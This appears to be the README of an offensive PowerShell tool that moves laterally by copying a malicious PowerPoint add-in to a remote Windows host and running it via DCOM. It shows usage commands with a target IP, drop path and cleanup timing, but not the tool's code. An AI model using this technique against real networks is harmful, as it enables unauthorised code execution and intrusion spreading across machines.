# Invoke-DCOMPowerPointPivot
This cmdlet executes lateral movement through PowerPoint DCOM via malicious Add-in

## Usage
```
(MANDATORY PARAMETERS)
        PS C:\> Invoke-DCOMPowerPointPivot -Target "192.168.1.20" -AddinPath "c:\PowerPoint.ppa"

(OPTIONAL PARAMETERS)
        PS C:\> Invoke-DCOMPowerPointPivot -Target "192.168.1.20" -AddinPath "c:\PowerPoint.ppa" -DestPath "c:\Windows\Temp\NiceFile.ppam" -ExecWaitTime 10
```

## Parameters

- Target
  - IP or hostname of target
- AddInPath
  - Local path to the PowerPoint Add-in
- DestPath (Optional)
  - Destination of the PowerPoint Add-in on the target
- ExecWaitTime (Optional)
  - Number of seconds to wait before unloading the Add-In and cleaning up

